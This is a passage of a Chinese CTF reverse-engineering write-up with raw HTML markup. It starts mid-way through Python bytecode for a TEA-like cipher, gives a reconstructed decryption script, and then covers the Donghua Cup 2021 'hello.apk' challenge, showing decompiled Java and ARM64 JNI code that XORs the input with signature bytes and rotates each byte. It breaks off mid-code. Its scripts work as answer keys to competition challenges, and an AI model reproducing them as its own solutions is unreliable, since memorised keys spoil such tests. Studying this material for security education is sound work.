class="number">8</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">12</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">14</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line"></span><br><span class="line">  <span class="number">8</span>          <span class="number">16</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">18</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line">  <span class="number">9</span>          <span class="number">20</span> LOAD_CONST               <span class="number">3</span> (<span class="number">6710886</span>)</span><br><span class="line">             <span class="number">22</span> STORE_FAST               <span class="number">5</span> (delta)</span><br><span class="line"></span><br><span class="line"> <span class="number">10</span>          <span class="number">24</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">             <span class="number">28</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">30</span> STORE_FAST               <span class="number">6</span> (k0)</span><br><span class="line"></span><br><span class="line"> <span class="number">11</span>          <span class="number">32</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">34</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">36</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">38</span> STORE_FAST               <span class="number">7</span> (k1)</span><br><span class="line"></span><br><span class="line"> <span class="number">12</span>          <span class="number">40</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">42</span> LOAD_CONST               <span class="number">4</span> (<span class="number">2</span>)</span><br><span class="line">             <span class="number">44</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">46</span> STORE_FAST               <span class="number">8</span> (k2)</span><br><span class="line"></span><br><span class="line"> <span class="number">13</span>          <span class="number">48</span> LOAD_FAST                <span class="number">1</span> (k)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">5</span> (<span class="number">3</span>)</span><br><span class="line">             <span class="number">52</span> BINARY_SUBSCR</span><br><span class="line">             <span class="number">54</span> STORE_FAST               <span class="number">9</span> (k3)</span><br><span class="line"></span><br><span class="line"> <span class="number">14</span>          <span class="number">56</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line">             <span class="number">58</span> LOAD_CONST               <span class="number">6</span> (<span class="number">32</span>)</span><br><span class="line">             <span class="number">60</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">62</span> GET_ITER</span><br><span class="line">        &gt;&gt;   <span class="number">64</span> FOR_ITER               <span class="number">108</span> (to <span class="number">174</span>)</span><br><span class="line">             <span class="number">66</span> STORE_FAST              <span class="number">10</span> (i)</span><br><span class="line"></span><br><span class="line"> <span class="number">15</span>          <span class="number">68</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">             <span class="number">70</span> LOAD_FAST                <span class="number">5</span> (delta)</span><br><span class="line">             <span class="number">72</span> INPLACE_ADD</span><br><span class="line">             <span class="number">74</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line"> <span class="number">16</span>          <span class="number">76</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">             <span class="number">78</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">             <span class="number">80</span> BINARY_AND</span><br><span class="line">             <span class="number">82</span> STORE_FAST               <span class="number">4</span> (x)</span><br><span class="line"></span><br><span class="line"> <span class="number">17</span>          <span class="number">84</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">             <span class="number">86</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">             <span class="number">88</span> LOAD_CONST               <span class="number">8</span> (<span class="number">4</span>)</span><br><span class="line">             <span class="number">90</span> BINARY_LSHIFT</span><br><span class="line">             <span class="number">92</span> LOAD_FAST                <span class="number">6</span> (k0)</span><br><span class="line">             <span class="number">94</span> BINARY_ADD</span><br><span class="line">             <span class="number">96</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">             <span class="number">98</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">            <span class="number">100</span> BINARY_ADD</span><br><span class="line">            <span class="number">102</span> BINARY_XOR</span><br><span class="line">            <span class="number">104</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">106</span> LOAD_CONST               <span class="number">9</span> (<span class="number">5</span>)</span><br><span class="line">            <span class="number">108</span> BINARY_RSHIFT</span><br><span class="line">            <span class="number">110</span> LOAD_FAST                <span class="number">7</span> (k1)</span><br><span class="line">            <span class="number">112</span> BINARY_ADD</span><br><span class="line">            <span class="number">114</span> BINARY_XOR</span><br><span class="line">            <span class="number">116</span> INPLACE_ADD</span><br><span class="line">            <span class="number">118</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line"> <span class="number">18</span>         <span class="number">120</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">122</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">            <span class="number">124</span> BINARY_AND</span><br><span class="line">            <span class="number">126</span> STORE_FAST               <span class="number">2</span> (v0)</span><br><span class="line"></span><br><span class="line"> <span class="number">19</span>         <span class="number">128</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">130</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">132</span> LOAD_CONST               <span class="number">8</span> (<span class="number">4</span>)</span><br><span class="line">            <span class="number">134</span> BINARY_LSHIFT</span><br><span class="line">            <span class="number">136</span> LOAD_FAST                <span class="number">8</span> (k2)</span><br><span class="line">            <span class="number">138</span> BINARY_ADD</span><br><span class="line">            <span class="number">140</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">142</span> LOAD_FAST                <span class="number">4</span> (x)</span><br><span class="line">            <span class="number">144</span> BINARY_ADD</span><br><span class="line">            <span class="number">146</span> BINARY_XOR</span><br><span class="line">            <span class="number">148</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">150</span> LOAD_CONST               <span class="number">9</span> (<span class="number">5</span>)</span><br><span class="line">            <span class="number">152</span> BINARY_RSHIFT</span><br><span class="line">            <span class="number">154</span> LOAD_FAST                <span class="number">9</span> (k3)</span><br><span class="line">            <span class="number">156</span> BINARY_ADD</span><br><span class="line">            <span class="number">158</span> BINARY_XOR</span><br><span class="line">            <span class="number">160</span> INPLACE_ADD</span><br><span class="line">            <span class="number">162</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line"></span><br><span class="line"> <span class="number">20</span>         <span class="number">164</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">166</span> LOAD_CONST               <span class="number">7</span> (<span class="number">4294967295</span>)</span><br><span class="line">            <span class="number">168</span> BINARY_AND</span><br><span class="line">            <span class="number">170</span> STORE_FAST               <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">172</span> JUMP_ABSOLUTE           <span class="number">64</span></span><br><span class="line"></span><br><span class="line"> <span class="number">21</span>     &gt;&gt;  <span class="number">174</span> LOAD_FAST                <span class="number">2</span> (v0)</span><br><span class="line">            <span class="number">176</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">178</span> LOAD_CONST               <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line">            <span class="number">180</span> STORE_SUBSCR</span><br><span class="line"></span><br><span class="line"> <span class="number">22</span>         <span class="number">182</span> LOAD_FAST                <span class="number">3</span> (v1)</span><br><span class="line">            <span class="number">184</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">186</span> LOAD_CONST               <span class="number">2</span> (<span class="number">1</span>)</span><br><span class="line">            <span class="number">188</span> STORE_SUBSCR</span><br><span class="line"></span><br><span class="line"> <span class="number">23</span>         <span class="number">190</span> LOAD_FAST                <span class="number">0</span> (v)</span><br><span class="line">            <span class="number">192</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    delta = <span class="number">0x666666</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        delta = (delta + x) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        x = delta  &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v0 = v0 + ( ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + x) ^ ( (v1&gt;&gt;<span class="number">5</span>) + k1))</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v1 = v1 + ( ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + x) ^ ( (v0&gt;&gt;<span class="number">5</span>) + k3))</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v[<span class="number">0</span>]=v0</span><br><span class="line">    v[<span class="number">1</span>]=v1</span><br><span class="line">    <span class="built_in">print</span>(v0, v1)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key =  [<span class="number">305419896</span>, <span class="number">2271560481</span>, <span class="number">2427178479</span>, <span class="number">4275878409</span>]</span><br><span class="line">arr = [[<span class="number">3888592564</span>, <span class="number">3737879155</span>], [<span class="number">4063334467</span>, <span class="number">2214487552</span>], [<span class="number">2420456096</span>, <span class="number">1529806583</span>], [<span class="number">2576007368</span>, <span class="number">2328179940</span>], [<span class="number">1665686107</span>, <span class="number">1748819876</span>]]</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;please input your secret key: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">encry = []</span><br><span class="line">encryted = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    encry.append(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, flag[i:   i+<span class="number">4</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line">    encry.append(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, flag[i+<span class="number">4</span>: i+<span class="number">8</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line">    encrypted = encrypt(encry, key)</span><br><span class="line">    encryted.append(encrypted)</span><br><span class="line">    encry = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(encryted != arr):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sry&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ok, fine&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>():</span></span><br><span class="line">    <span class="keyword">for</span> arri <span class="keyword">in</span> arr:</span><br><span class="line">        v0 = arri[<span class="number">0</span>]</span><br><span class="line">        v1 = arri[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            v1 = (v1 - ( ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + xx[i]) ^ ( (v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v0 = (v0 - ( ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + xx[i]) ^ ( (v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>]))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v1 = v1 &amp; <span class="number">0xffffffff</span></span><br><span class="line">            v0 = v0 &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="comment"># print(v0, v1)</span></span><br><span class="line">        <span class="built_in">print</span>(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v0).decode(<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, v1).decode(<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">xx = []</span><br><span class="line">x_ = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x666666</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    x_ = (x_ + delta) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    xx.append(x_)</span><br><span class="line"></span><br><span class="line">k = key</span><br><span class="line">decrypt()</span><br></pre></td></tr></table></figure><h1 id="hello-apk"><a href="#hello-apk" class="headerlink" title="hello.apk"></a>hello.apk</h1><blockquote><p>“东华杯” 2021年大学生网络安全邀请赛暨第七届上海市大学生网络安全大赛</p></blockquote><p>本题为常见的<code>encode(flag, key)=cipher</code>的校验模式。<br>Java层可以得到信息：flag长度为42，key是程序的签名，校验函数是<code>StringFromJNI</code>，在native层。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg7)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.input.getText().length() == <span class="number">42</span>) &#123;</span><br><span class="line">            Toast v7_2 = Toast.makeText(</span><br><span class="line">                MainActivity.<span class="keyword">this</span>, </span><br><span class="line">                                  MainActivity.<span class="keyword">this</span>.stringFromJNI(</span><br><span class="line">                                      MainActivity.<span class="keyword">this</span>.input.getText().toString(), </span><br><span class="line">                                      <span class="keyword">new</span> hi().getSignatures(arg7)),</span><br><span class="line">                  <span class="number">1</span>);</span><br><span class="line">            v7_2.setGravity(<span class="number">0</span>, <span class="number">0</span>, -<span class="number">700</span>);</span><br><span class="line">            v7_2.show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Toast v7_3 = Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;Hello!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        v7_3.setGravity(<span class="number">0</span>, <span class="number">0</span>, -<span class="number">700</span>);</span><br><span class="line">        v7_3.show();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(PackageManager.NameNotFoundException v7_1) &#123;  v7_1.printStackTrace();   &#125;</span><br><span class="line">    <span class="keyword">catch</span>(NoSuchAlgorithmException v7) &#123;      v7.printStackTrace();    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hi</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Log Log;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSignatures</span><span class="params">(View arg3)</span> <span class="keyword">throws</span> PackageManager.NameNotFoundException, NoSuchAlgorithmException </span>&#123;</span><br><span class="line">        MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        Signature[] signs = arg3.getContext().getPackageManager().getPackageInfo(<span class="string">&quot;com.example.hello&quot;</span>, <span class="number">0x40</span>).signatures;</span><br><span class="line">        <span class="keyword">if</span>(signs.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            Signature sign = signs[<span class="number">0</span>]; <span class="comment">// 一个程序可能拥有多个签名</span></span><br><span class="line">            Log.i(<span class="string">&quot;hello&quot;</span>, sign.toCharsString());</span><br><span class="line">            <span class="keyword">return</span> sign.toCharsString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this_is_your_gift!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在native层，主要对flag进行了两次处理，最后与目标数组进行比较。<br>因为这里使用的是arm64，所以稍微有些陌生，需要阅读汇编代码。</p><p>先是对flag进行抑或加密，从下标1开始。抑或密钥来自签名sign，从sign的354下标开始，每次向后移动27。<br>然后对flag进行循环位移操作，这里使用了一些向量操作函数，但简单来说就是对flag的每个byte向右循环移动3位。<br>然后把flag与cipher进行比较，cipher的具体值可从ida中导出。<br>此外，sign的值可以通过安装运行从Log中获取。也可以使用JEB等工具导出<code>certificate</code>文件，二进制数据即为signatures。<br>虽然apk中<code>android:testOnly=true</code>，但是可以通过<code>adb -t install xxx.apk</code>安装。（感谢@Guohong的提示）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring __fastcall <span class="title">Java_com_example_hello_MainActivity_stringFromJNI</span><span class="params">(JNIEnv *env, __int64 thiz, __int64 input, __int64 sign)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int8x16_t</span> *inputs; <span class="comment">// x20</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *signs; <span class="comment">// x0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *signs1; <span class="comment">// x21</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 ind; <span class="comment">// x23</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ind_p27; <span class="comment">// w24</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// w1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// w9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v13; <span class="comment">// w11</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// w12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// w13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// w14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// w15</span></span><br><span class="line">  <span class="keyword">int8x16_t</span> v18; <span class="comment">// q0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v19; <span class="comment">// w16</span></span><br><span class="line">  <span class="keyword">int8x16_t</span> v20; <span class="comment">// q1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v21; <span class="comment">// w17</span></span><br><span class="line">  __int64 ind2; <span class="comment">// x8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *retStr1; <span class="comment">// x21</span></span><br><span class="line">  jstring v24; <span class="comment">// x19</span></span><br><span class="line">  <span class="keyword">char</span> retStr[<span class="number">16</span>]; <span class="comment">// [xsp+0h] [xbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v27; <span class="comment">// [xsp+10h] [xbp-40h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [xsp+18h] [xbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v28 = *(_QWORD *)(_ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>)) + <span class="number">40</span>);</span><br><span class="line">  inputs = (<span class="keyword">int8x16_t</span> *)(*env)-&gt;GetStringUTFChars(env, input, <span class="number">0LL</span>);</span><br><span class="line">  <span class="comment">// input本为42个byte的数组，在这里被保存为一个3x(16 byte)的对象，后续通过input[0],input[1],input[2]引用。</span></span><br><span class="line">  <span class="comment">// input[2]只有10个byte。</span></span><br><span class="line">  signs = (*env)-&gt;GetStringUTFChars(env, sign, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( inputs-&gt;n128_u8[<span class="number">0</span>] ) <span class="comment">// 汇编：LDRB W8, [X20]，即input[0],后续相同</span></span><br><span class="line">  &#123;</span><br><span class="line">    signs1 = signs;</span><br><span class="line">    inputs-&gt;n128_u8[<span class="number">0</span>] ^= signs[<span class="number">327</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)inputs) &gt;= <span class="number">2uLL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ind = <span class="number">1LL</span>;</span><br><span class="line">      ind_p27 = <span class="number">354</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123; <span class="comment">// input[ind] = input[ind] ^ (sign[ind_p27] + ind)</span></span><br><span class="line">        inputs-&gt;n128_u8[ind] ^= signs1[ind_p27] + (_BYTE)ind;<span class="comment">// sign的长度比较迷惑，通过Log获取</span></span><br><span class="line">        ++ind;</span><br><span class="line">        ind_p27 += <span class="number">27</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)inputs) &gt; ind );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// inputs的长度是int8x16 bit，即16char。输入42，刚好最后10单独处理</span></span><br><span class="line">  <span class="comment">// 简单来说，就是每个byte交换高3位和低5位的位置，或者说向右循环移动3位</span></span><br><span class="line">  v11 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>]);</span><br><span class="line">  v12 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">1</span>]);</span><br><span class="line">  v13 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">3</span>]);</span><br><span class="line">  v14 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">4</span>]);</span><br><span class="line">  v15 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">5</span>]);</span><br><span class="line">  v16 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">6</span>]);</span><br><span class="line">  v17 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">7</span>]);</span><br><span class="line">  v18 = vorrq_s8(vshrq_n_u8(*inputs, <span class="number">3uLL</span>), vshlq_n_s8(*inputs, <span class="number">5uLL</span>));</span><br><span class="line">  v19 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">8</span>]);</span><br><span class="line">  v20 = vorrq_s8(vshrq_n_u8(inputs[<span class="number">1</span>], <span class="number">3uLL</span>), vshlq_n_s8(inputs[<span class="number">1</span>], <span class="number">5uLL</span>));</span><br><span class="line">  v21 = (inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0xFFFFE01F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">9</span>]);</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>] = (inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span> | (<span class="number">32</span> * inputs[<span class="number">2</span>].n128_u8[<span class="number">2</span>]);</span><br><span class="line">  inputs[<span class="number">2</span>].n128_u8[<span class="number">0</span>] = v11;</span><br><span class="line">  inputs[<span 